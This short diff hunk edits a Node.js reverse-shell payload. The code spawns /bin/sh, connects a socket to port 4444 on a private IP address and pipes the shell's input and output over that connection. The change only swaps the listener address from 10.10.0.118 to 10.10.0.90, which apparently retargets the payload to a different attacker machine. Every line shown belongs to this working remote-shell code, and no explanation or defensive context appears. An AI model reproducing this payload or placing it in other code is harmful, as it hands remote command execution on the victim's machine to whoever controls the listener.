@@ -3,7 +3,7 @@
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(4444, "10.10.0.118", function(){
+    client.connect(4444, "10.10.0.90", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
